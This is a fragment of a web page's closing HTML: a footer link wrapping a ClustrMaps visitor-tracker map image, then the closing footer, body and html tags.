    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>